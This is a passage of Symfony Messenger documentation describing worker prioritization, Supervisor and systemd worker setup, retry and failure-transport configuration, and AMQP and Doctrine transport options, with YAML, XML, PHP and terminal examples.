xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async_priority_high\" dsn=\"%env(MESSENGER_TRANSPORT_DSN)%\">\n                        <framework:options>\n                            <framework:queue>\n                                <framework:name>Queue</framework:name>\n                            </framework:queue>\n                        </framework:options>\n                    </framework:transport>\n                    <framework:transport name=\"async_priority_low\" dsn=\"%env(MESSENGER_TRANSPORT_DSN)%\">\n                        <option key=\"queue_name\">low</option>\n                    </framework:transport>\n\n                    <framework:routing message-class=\"App\\Message\\SmsNotification\">\n                        <framework:sender service=\"async_priority_low\"/>\n                    </framework:routing>\n                    <framework:routing message-class=\"App\\Message\\NewUserWelcomeEmail\">\n                        <framework:sender service=\"async_priority_high\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('async_priority_high')\n                ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                ->options(['queue_name' => 'high']);\n\n            $messenger->transport('async_priority_low')\n                ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                ->options(['queue_name' => 'low']);\n\n            $messenger->routing('App\\Message\\SmsNotification')->senders(['async_priority_low']);\n            $messenger->routing('App\\Message\\NewUserWelcomeEmail')->senders(['async_priority_high']);\n        };\n\nYou can then run individual workers for each transport or instruct one worker\nto handle messages in a priority order:\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume async_priority_high async_priority_low\n\nThe worker will always first look for messages waiting on ``async_priority_high``. If\nthere are none, *then* it will consume messages from ``async_priority_low``.\n\n.. _messenger-limit-queues:\n\nLimit Consuming to Specific Queues\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSome transports (notably AMQP) have the concept of exchanges and queues. A Symfony\ntransport is always bound to an exchange. By default, the worker consumes from all\nqueues attached to the exchange of the specified transport. However, there are use\ncases to want a worker to only consume from specific queues.\n\nYou can limit the worker to only process messages from specific queue(s):\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume my_transport --queues=fasttrack\n\n    # you can pass the --queues option more than once to process multiple queues\n    $ php bin/console messenger:consume my_transport --queues=fasttrack1 --queues=fasttrack2\n\n.. note::\n\n    To allow using the ``queues`` option, the receiver must implement the\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Transport\\\\Receiver\\\\QueueReceiverInterface`.\n\n.. _messenger-message-count:\n\nChecking the Number of Queued Messages Per Transport\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRun the ``messenger:stats`` command to know how many messages are in the \"queues\"\nof some or all transports:\n\n.. code-block:: terminal\n\n    # displays the number of queued messages in all transports\n    $ php bin/console messenger:stats\n\n    # shows stats only for some transports\n    $ php bin/console messenger:stats my_transport_name other_transport_name\n\n.. note::\n\n    In order for this command to work, the configured transport's receiver must implement\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Transport\\\\Receiver\\\\MessageCountAwareInterface`.\n\n.. _messenger-supervisor:\n\nSupervisor Configuration\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nSupervisor is a great tool to guarantee that your worker process(es) is\n*always* running (even if it closes due to failure, hitting a message limit\nor thanks to ``messenger:stop-workers``). You can install it on Ubuntu, for\nexample, via:\n\n.. code-block:: terminal\n\n    $ sudo apt-get install supervisor\n\nSupervisor configuration files typically live in a ``/etc/supervisor/conf.d``\ndirectory. For example, you can create a new ``messenger-worker.conf`` file\nthere to make sure that 2 instances of ``messenger:consume`` are running at all\ntimes:\n\n.. code-block:: ini\n\n    ;/etc/supervisor/conf.d/messenger-worker.conf\n    [program:messenger-consume]\n    command=php /path/to/your/app/bin/console messenger:consume async --time-limit=3600\n    user=ubuntu\n    numprocs=2\n    startsecs=0\n    autostart=true\n    autorestart=true\n    startretries=10\n    process_name=%(program_name)s_%(process_num)02d\n\nChange the ``async`` argument to use the name of your transport (or transports)\nand ``user`` to the Unix user on your server.\n\n.. warning::\n\n    During a deployment, something might be unavailable (e.g. the\n    database) causing the consumer to fail to start. In this situation,\n    Supervisor will try ``startretries`` number of times to restart the\n    command. Make sure to change this setting to avoid getting the command\n    in a FATAL state, which will never restart again.\n\n    Each restart, Supervisor increases the delay by 1 second. For instance, if\n    the value is ``10``, it will wait 1 sec, 2 sec, 3 sec, etc. This gives the\n    service a total of 55 seconds to become available again. Increase the\n    ``startretries`` setting to cover the maximum expected downtime.\n\nIf you use the Redis Transport, note that each worker needs a unique consumer\nname to avoid the same message being handled by multiple workers. One way to\nachieve this is to set an environment variable in the Supervisor configuration\nfile, which you can then refer to in ``messenger.yaml``\n(see the :ref:`Redis section <messenger-redis-transport>` below):\n\n.. code-block:: ini\n\n    environment=MESSENGER_CONSUMER_NAME=%(program_name)s_%(process_num)02d\n\nNext, tell Supervisor to read your config and start your workers:\n\n.. code-block:: terminal\n\n    $ sudo supervisorctl reread\n\n    $ sudo supervisorctl update\n\n    $ sudo supervisorctl start messenger-consume:*\n\n    # If you deploy an update of your code, don't forget to restart your workers\n    # to run the new code\n    $ sudo supervisorctl restart messenger-consume:*\n\nSee the `Supervisor docs`_ for more details.\n\nGraceful Shutdown\n.................\n\nIf you install the `PCNTL`_ PHP extension in your project, workers will handle\nthe ``SIGTERM`` or ``SIGINT`` POSIX signals to finish processing their current\nmessage before terminating.\n\nHowever, you might prefer to use different POSIX signals for graceful shutdown.\nYou can override default ones by setting the ``framework.messenger.stop_worker_on_signals``\nconfiguration option.\n\nIn some cases the ``SIGTERM`` signal is sent by Supervisor itself (e.g. stopping\na Docker container having Supervisor as its entrypoint). In these cases you\nneed to add a ``stopwaitsecs`` key to the program configuration (with a value\nof the desired grace period in seconds) in order to perform a graceful shutdown:\n\n.. code-block:: ini\n\n    [program:x]\n    stopwaitsecs=20\n\n.. _messenger-systemd:\n\nSystemd Configuration\n~~~~~~~~~~~~~~~~~~~~~\n\nWhile Supervisor is a great tool, it has the disadvantage that you need system\naccess to run it. Systemd has become the standard on most Linux distributions,\nand has a good alternative called *user services*.\n\nSystemd user service configuration files typically live in a ``~/.config/systemd/user``\ndirectory. For example, you can create a new ``messenger-worker.service`` file. Or a\n``messenger-worker@.service`` file if you want more instances running at the same time:\n\n.. code-block:: ini\n\n    [Unit]\n    Description=Symfony messenger-consume %i\n\n    [Service]\n    ExecStart=php /path/to/your/app/bin/console messenger:consume async --time-limit=3600\n    Restart=always\n    RestartSec=30\n\n    [Install]\n    WantedBy=default.target\n\nNow, tell systemd to enable and start one worker:\n\n.. code-block:: terminal\n\n    $ systemctl --user enable messenger-worker@1.service\n    $ systemctl --user start messenger-worker@1.service\n\n    # to enable and start 20 workers\n    $ systemctl --user enable messenger-worker@{1..20}.service\n    $ systemctl --user start messenger-worker@{1..20}.service\n\nIf you change your service config file, you need to reload the daemon:\n\n.. code-block:: terminal\n\n    $ systemctl --user daemon-reload\n\nTo restart all your consumers:\n\n.. code-block:: terminal\n\n    $ systemctl --user restart messenger-consume@*.service\n\nThe systemd user instance is only started after the first login of the\nparticular user. Consumer often need to start on system boot instead.\nEnable lingering on the user to activate that behavior:\n\n.. code-block:: terminal\n\n    $ loginctl enable-linger <your-username>\n\nLogs are managed by journald and can be worked with using the journalctl\ncommand:\n\n.. code-block:: terminal\n\n    # follow logs of consumer nr 11\n    $ journalctl -f --user-unit messenger-consume@11.service\n\n    # follow logs of all consumers\n    $ journalctl -f --user-unit messenger-consume@*\n\n    # follow all logs from your user services\n    $ journalctl -f _UID=$UID\n\nSee the `systemd docs`_ for more details.\n\n.. note::\n\n    You either need elevated privileges for the ``journalctl`` command, or add\n    your user to the systemd-journal group:\n\n    .. code-block:: terminal\n\n        $ sudo usermod -a -G systemd-journal <your-username>\n\nStateless Worker\n~~~~~~~~~~~~~~~~\n\nPHP is designed to be stateless, there are no shared resources across different\nrequests. In HTTP context PHP cleans everything after sending the response, so\nyou can decide to not take care of services that may leak memory.\n\nOn the other hand, it's common for workers to process messages sequentially in\nlong-running CLI processes which don't finish after processing a single message.\nBeware about service states to prevent information and/or memory leakage as\nSymfony will inject the same instance of a service in all messages, preserving\nthe internal state of the services.\n\nHowever, certain Symfony services, such as the Monolog\n:ref:`fingers crossed handler <logging-handler-fingers_crossed>`, leak by design.\nSymfony provides a **service reset** feature to solve this problem. When resetting\nthe container automatically between two messages, Symfony looks for any services\nimplementing :class:`Symfony\\\\Contracts\\\\Service\\\\ResetInterface` (including your\nown services) and calls their ``reset()`` method so they can clean their internal state.\n\nIf a service is not stateless and you want to reset its properties after each message, then\nthe service must implement :class:`Symfony\\\\Contracts\\\\Service\\\\ResetInterface` where you can reset the\nproperties in the ``reset()`` method.\n\nIf you don't want to reset the container, add the ``--no-reset`` option when\nrunning the ``messenger:consume`` command.\n\n.. _messenger-retries-failures:\n\nRate Limited Transport\n~~~~~~~~~~~~~~~~~~~~~~\n\nSometimes you might need to rate limit your message worker. You can configure a\nrate limiter on a transport (requires the :doc:`RateLimiter component </rate_limiter>`)\nby setting its ``rate_limiter`` option:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async:\n                        rate_limiter: your_rate_limiter_name\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async\">\n                        <option key=\"rate_limiter\">your_rate_limiter_name</option>\n                    </framework:transport>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework) {\n            $framework->messenger()\n                ->transport('async')\n                    ->options(['rate_limiter' => 'your_rate_limiter_name'])\n            ;\n        };\n\n.. warning::\n\n    When a rate limiter is configured on a transport, it will block the whole\n    worker when the limit is hit. You should make sure you configure a dedicated\n    worker for a rate limited transport to avoid other transports to be blocked.\n\nRetries & Failures\n------------------\n\nIf an exception is thrown while consuming a message from a transport it will\nautomatically be re-sent to the transport to be tried again. By default, a message\nwill be retried 3 times before being discarded or\n:ref:`sent to the failure transport <messenger-failure-transport>`. Each retry\nwill also be delayed, in case the failure was due to a temporary issue. All of\nthis is configurable for each transport:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async_priority_high:\n                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'\n\n                        # default configuration\n                        retry_strategy:\n                            max_retries: 3\n                            # milliseconds delay\n                            delay: 1000\n                            # causes the delay to be higher before each retry\n                            # e.g. 1 second delay, 2 seconds, 4 seconds\n                            multiplier: 2\n                            max_delay: 0\n                            # applies randomness to the delay that can prevent the thundering herd effect\n                            # the value (between 0 and 1.0) is the percentage of 'delay' that will be added/subtracted\n                            jitter: 0.1\n                            # override all of this with a service that\n                            # implements Symfony\\Component\\Messenger\\Retry\\RetryStrategyInterface\n                            # service: null\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async_priority_high\" dsn=\"%env(MESSENGER_TRANSPORT_DSN)%?queue_name=high_priority\">\n                        <framework:retry-strategy max-retries=\"3\" delay=\"1000\" multiplier=\"2\" max-delay=\"0\" jitter=\"0.1\"/>\n                    </framework:transport>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('async_priority_high')\n                ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                // default configuration\n                ->retryStrategy()\n                    ->maxRetries(3)\n                    // milliseconds delay\n                    ->delay(1000)\n                    // causes the delay to be higher before each retry\n                    // e.g. 1 second delay, 2 seconds, 4 seconds\n                    ->multiplier(2)\n                    ->maxDelay(0)\n                    // applies randomness to the delay that can prevent the thundering herd effect\n                    // the value (between 0 and 1.0) is the percentage of 'delay' that will be added/subtracted\n                    ->jitter(0.1)\n                    // override all of this with a service that\n                    // implements Symfony\\Component\\Messenger\\Retry\\RetryStrategyInterface\n                    ->service(null)\n            ;\n        };\n\n.. versionadded:: 7.1\n\n    The ``jitter`` option was introduced in Symfony 7.1.\n\n.. tip::\n\n    Symfony triggers a :class:`Symfony\\\\Component\\\\Messenger\\\\Event\\\\WorkerMessageRetriedEvent`\n    when a message is retried so you can run your own logic.\n\n.. note::\n\n    Thanks to :class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\SerializedMessageStamp`,\n    the serialized form of the message is saved, which prevents to serialize it\n    again if the message is later retried.\n\nAvoiding Retrying\n~~~~~~~~~~~~~~~~~\n\nSometimes handling a message might fail in a way that you *know* is permanent\nand should not be retried. If you throw\n:class:`Symfony\\\\Component\\\\Messenger\\\\Exception\\\\UnrecoverableMessageHandlingException`,\nthe message will not be retried.\n\n.. note::\n\n    Messages that will not be retried, will still show up in the configured failure transport.\n    If you want to avoid that, consider handling the error yourself and let the handler\n    successfully end.\n\nForcing Retrying\n~~~~~~~~~~~~~~~~\n\nSometimes handling a message must fail in a way that you *know* is temporary\nand must be retried. If you throw\n:class:`Symfony\\\\Component\\\\Messenger\\\\Exception\\\\RecoverableMessageHandlingException`,\nthe message will always be retried infinitely and ``max_retries`` setting will be ignored.\n\n.. _messenger-failure-transport:\n\nSaving & Retrying Failed Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf a message fails it is retried multiple times (``max_retries``) and then will\nbe discarded. To avoid this happening, you can instead configure a ``failure_transport``:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                # after retrying, messages will be sent to the \"failed\" transport\n                failure_transport: failed\n\n                transports:\n                    # ... other transports\n\n                    failed: 'doctrine://default?queue_name=failed'\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- after retrying, messages will be sent to the \"failed\" transport -->\n                <framework:messenger failure-transport=\"failed\">\n                    <!-- ... other transports -->\n\n                    <framework:transport name=\"failed\" dsn=\"doctrine://default?queue_name=failed\"/>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            // after retrying, messages will be sent to the \"failed\" transport\n            $messenger->failureTransport('failed');\n\n            // ... other transports\n\n            $messenger->transport('failed')\n                ->dsn('doctrine://default?queue_name=failed');\n        };\n\nIn this example, if handling a message fails 3 times (default ``max_retries``),\nit will then be sent to the ``failed`` transport. While you *can* use\n``messenger:consume failed`` to consume this like a normal transport, you'll\nusually want to manually view the messages in the failure transport and choose\nto retry them:\n\n.. code-block:: terminal\n\n    # see all messages in the failure transport with a default limit of 50\n    $ php bin/console messenger:failed:show\n\n    # see the 10 first messages\n    $ php bin/console messenger:failed:show --max=10\n\n    # see only MyClass messages\n    $ php bin/console messenger:failed:show --class-filter='MyClass'\n\n    # see the number of messages by message class\n    $ php bin/console messenger:failed:show --stats\n\n    # see details about a specific failure\n    $ php bin/console messenger:failed:show 20 -vv\n\n    # view and retry messages one-by-one\n    $ php bin/console messenger:failed:retry -vv\n\n    # retry specific messages\n    $ php bin/console messenger:failed:retry 20 30 --force\n\n    # remove a message without retrying it\n    $ php bin/console messenger:failed:remove 20\n\n    # remove messages without retrying them and show each message before removing it\n    $ php bin/console messenger:failed:remove 20 30 --show-messages\n\n    # remove all messages in the failure transport\n    $ php bin/console messenger:failed:remove --all\n\nIf the message fails again, it will be re-sent back to the failure transport\ndue to the normal :ref:`retry rules <messenger-retries-failures>`. Once the max\nretry has been hit, the message will be discarded permanently.\n\nMultiple Failed Transports\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSometimes it is not enough to have a single, global ``failed transport`` configured\nbecause some messages are more important than others. In those cases, you can\noverride the failure transport for only specific transports:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                # after retrying, messages will be sent to the \"failed\" transport\n                # by default if no \"failed_transport\" is configured inside a transport\n                failure_transport: failed_default\n\n                transports:\n                    async_priority_high:\n                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'\n                        failure_transport: failed_high_priority\n\n                    # since no failed transport is configured, the one used will be\n                    # the global \"failure_transport\" set\n                    async_priority_low:\n                        dsn: 'doctrine://default?queue_name=async_priority_low'\n\n                    failed_default: 'doctrine://default?queue_name=failed_default'\n                    failed_high_priority: 'doctrine://default?queue_name=failed_high_priority'\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- after retrying, messages will be sent to the \"failed\" transport\n                by default if no \"failed-transport\" is configured inside a transport -->\n                <framework:messenger failure-transport=\"failed_default\">\n                    <framework:transport name=\"async_priority_high\" dsn=\"%env(MESSENGER_TRANSPORT_DSN)%\" failure-transport=\"failed_high_priority\"/>\n                    <!-- since no \"failed_transport\" is configured, the one used will be\n                    the global \"failed_transport\" set -->\n                    <framework:transport name=\"async_priority_low\" dsn=\"doctrine://default?queue_name=async_priority_low\"/>\n\n                    <framework:transport name=\"failed_default\" dsn=\"doctrine://default?queue_name=failed_default\"/>\n                    <framework:transport name=\"failed_high_priority\" dsn=\"doctrine://default?queue_name=failed_high_priority\"/>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            // after retrying, messages will be sent to the \"failed\" transport\n            // by default if no \"failure_transport\" is configured inside a transport\n            $messenger->failureTransport('failed_default');\n\n            $messenger->transport('async_priority_high')\n                ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                ->failureTransport('failed_high_priority');\n\n            // since no failed transport is configured, the one used will be\n            // the global failure_transport set\n           $messenger->transport('async_priority_low')\n                ->dsn('doctrine://default?queue_name=async_priority_low');\n\n           $messenger->transport('failed_default')\n                ->dsn('doctrine://default?queue_name=failed_default');\n\n           $messenger->transport('failed_high_priority')\n                ->dsn('doctrine://default?queue_name=failed_high_priority');\n        };\n\nIf there is no ``failure_transport`` defined globally or on the transport level,\nthe messages will be discarded after the number of retries.\n\nThe failed commands have an optional option ``--transport`` to specify\nthe ``failure_transport`` configured at the transport level.\n\n.. code-block:: terminal\n\n    # see all messages in \"failure_transport\" transport\n    $ php bin/console messenger:failed:show --transport=failure_transport\n\n    # retry specific messages from \"failure_transport\"\n    $ php bin/console messenger:failed:retry 20 30 --transport=failure_transport --force\n\n    # remove a message without retrying it from \"failure_transport\"\n    $ php bin/console messenger:failed:remove 20 --transport=failure_transport\n\n.. _messenger-transports-config:\n\nTransport Configuration\n-----------------------\n\nMessenger supports a number of different transport types, each with their own\noptions. Options can be passed to the transport via a DSN string or configuration.\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=amqp://localhost/%2f/messages?auto_setup=false\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    my_transport:\n                        dsn: \"%env(MESSENGER_TRANSPORT_DSN)%\"\n                        options:\n                            auto_setup: false\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"my_transport\" dsn=\"%env(MESSENGER_TRANSPORT_DSN)%\">\n                        <framework:options auto-setup=\"false\"/>\n                    </framework:transport>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            $messenger->transport('my_transport')\n                ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                ->options(['auto_setup' => false]);\n        };\n\nOptions defined under ``options`` take precedence over ones defined in the DSN.\n\nAMQP Transport\n~~~~~~~~~~~~~~\n\nThe AMQP transport uses the AMQP PHP extension to send messages to queues like\nRabbitMQ. Install it by running:\n\n.. code-block:: terminal\n\n    $ composer require symfony/amqp-messenger\n\nThe AMQP transport DSN may looks like this:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=amqp://guest:guest@localhost:5672/%2f/messages\n\n    # or use the AMQPS protocol\n    MESSENGER_TRANSPORT_DSN=amqps://guest:guest@localhost/%2f/messages\n\nIf you want to use TLS/SSL encrypted AMQP, you must also provide a CA certificate.\nDefine the certificate path in the ``amqp.cacert`` PHP.ini setting\n(e.g. ``amqp.cacert = /etc/ssl/certs``) or in the ``cacert`` parameter of the\nDSN (e.g ``amqps://localhost?cacert=/etc/ssl/certs/``).\n\nThe default port used by TLS/SSL encrypted AMQP is 5671, but you can overwrite\nit in the ``port`` parameter of the DSN (e.g. ``amqps://localhost?cacert=/etc/ssl/certs/&port=12345``).\n\n.. note::\n\n    By default, the transport will automatically create any exchanges, queues and\n    binding keys that are needed. That can be disabled, but some functionality\n    may not work correctly (like delayed queues).\n    To not autocreate any queues, you can configure a transport with ``queues: []``.\n\n.. note::\n\n    You can limit the consumer of an AMQP transport to only process messages\n    from some queues of an exchange. See :ref:`messenger-limit-queues`.\n\nThe transport has a number of other options, including ways to configure\nthe exchange, queues binding keys and more. See the documentation on\n:class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\Amqp\\\\Transport\\\\Connection`.\n\nThe transport has a number of options:\n\n``auto_setup`` (default: ``true``)\n    Whether the exchanges and queues should be created automatically during\n    send / get.\n\n``cacert``\n    Path to the CA cert file in PEM format.\n\n``cert``\n    Path to the client certificate in PEM format.\n\n``channel_max``\n    Specifies highest channel number that the server permits. 0 means standard\n    extension limit\n\n``confirm_timeout``\n    Timeout in seconds for confirmation; if none specified, transport will not\n    wait for message confirmation. Note: 0 or greater seconds. May be\n    fractional.\n\n``connect_timeout``\n    Connection timeout. Note: 0 or greater seconds. May be fractional.\n\n``frame_max``\n    The largest frame size that the server proposes for the connection,\n    including frame header and end-byte. 0 means standard extension limit\n    (depends on librabbimq default frame size limit)\n\n``heartbeat``\n    The delay, in seconds, of the connection heartbeat that the server wants. 0\n    means the server does not want a heartbeat. Note, librabbitmq has limited\n    heartbeat support, which means heartbeats checked only during blocking\n    calls.\n\n``host``\n    Hostname of the AMQP service\n\n``key``\n    Path to the client key in PEM format.\n\n``login``\n    Username to use to connect the AMQP service\n\n``password``\n    Password to use to connect to the AMQP service\n\n``persistent`` (default: ``'false'``)\n    Whether the connection is persistent\n\n``port``\n    Port of the AMQP service\n\n``read_timeout``\n    Timeout in for income activity. Note: 0 or greater seconds. May be\n    fractional.\n\n``retry``\n    (no description available)\n\n``sasl_method``\n    (no description available)\n\n``connection_name``\n    For custom connection names (requires at least version 1.10 of the PHP AMQP\n    extension)\n\n``verify``\n    Enable or disable peer verification. If peer verification is enabled then\n    the common name in the server certificate must match the server name. Peer\n    verification is enabled by default.\n\n``vhost``\n    Virtual Host to use with the AMQP service\n\n``write_timeout``\n    Timeout in for outcome activity. Note: 0 or greater seconds. May be\n    fractional.\n\n``delay[queue_name_pattern]`` (default: ``delay_%exchange_name%_%routing_key%_%delay%``)\n    Pattern to use to create the queues\n\n``delay[exchange_name]`` (default: ``delays``)\n    Name of the exchange to be used for the delayed/retried messages\n\n``queues[name][arguments]``\n    Extra arguments\n\n``queues[name][binding_arguments]``\n    Arguments to be used while binding the queue.\n\n``queues[name][binding_keys]``\n    The binding keys (if any) to bind to this queue\n\n``queues[name][flags]`` (default: ``AMQP_DURABLE``)\n    Queue flags\n\n``exchange[arguments]``\n    Extra arguments for the exchange (e.g. ``alternate-exchange``)\n\n``exchange[default_publish_routing_key]``\n    Routing key to use when publishing, if none is specified on the message\n\n``exchange[flags]`` (default: ``AMQP_DURABLE``)\n    Exchange flags\n\n``exchange[name]``\n    Name of the exchange\n\n``exchange[type]`` (default: ``fanout``)\n    Type of exchange\n\nYou can also configure AMQP-specific settings on your message by adding\n:class:`Symfony\\\\Component\\\\Messenger\\\\Bridge\\\\Amqp\\\\Transport\\\\AmqpStamp` to\nyour Envelope::\n\n    use Symfony\\Component\\Messenger\\Bridge\\Amqp\\Transport\\AmqpStamp;\n    // ...\n\n    $attributes = [];\n    $bus->dispatch(new SmsNotification(), [\n        new AmqpStamp('custom-routing-key', AMQP_NOPARAM, $attributes),\n    ]);\n\n.. warning::\n\n    The consumers do not show up in an admin panel as this transport does not rely on\n    ``\\AmqpQueue::consume()`` which is blocking. Having a blocking receiver makes\n    the ``--time-limit/--memory-limit`` options of the ``messenger:consume`` command as well as\n    the ``messenger:stop-workers`` command inefficient, as they all rely on the fact that\n    the receiver returns immediately no matter if it finds a message or not. The consume\n    worker is responsible for iterating until it receives a message to handle and/or until one\n    of the stop conditions is reached. Thus, the worker's stop logic cannot be reached if it\n    is stuck in a blocking call.\n\n.. tip::\n\n    If your application faces socket exceptions or `high connection churn`_\n    (shown by the rapid creation and deletion of connections), consider using\n    `AMQProxy`_. This tool works as a gateway between Symfony Messenger and AMQP server,\n    maintaining stable connections and minimizing overheads (which also improves\n    the overall performance).\n\nDoctrine Transport\n~~~~~~~~~~~~~~~~~~\n\nThe Doctrine transport can be used to store messages in a database table.\nInstall it by running:\n\n.. code-block:: terminal\n\n    $ composer require symfony/doctrine-messenger\n\nThe Doctrine transport DSN may looks like this:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=doctrine://default\n\nThe format is ``doctrine://<connection_name>``, in case you have multiple connections\nand want to use one other than the \"default\". The transport will automatically create\na table named ``messenger_messages``.\n\nIf you want to change the default table name, pass a custom table name in the\nDSN by using the ``table_name`` option:\n\n.. code-block:: env\n\n    # .env\n    MESSENGER_TRANSPORT_DSN=doctrine://default?table_name=your_custom_table_name\n\nOr, to create the table yourself, set the ``auto_setup`` option to ``false`` and\n:ref:`generate a migration <doctrine-creating-the-database-tables-schema>`.\n\nThe transport has a number of options:\n\n``table_name`` (default: ``messenger_messages``)\n    Name of the table\n\n``queue_name`` (default: ``default``)\n    Name of the queue (a column in the table, to use one table for multiple\n    transports)\n\n``redeliver_timeout`` (default: ``3600``)\n    Timeout before retrying a message that's in the queue but in the \"handling\"\n    state (if a worker stopped for some reason, this will occur, eventually you\n    should retry the message) - in seconds.\n\n    .. note::\n\n        Set ``redeliver_timeout`` to a greater value than your slowest message\n        duration. Otherwise, some messages will start a second time while the\n        first one is still being handled.\n\n``auto_setup``\n    Whether the table should be created automatically during send / get.\n\nWhen using PostgreSQL, you have access to the following options to leverage\nthe 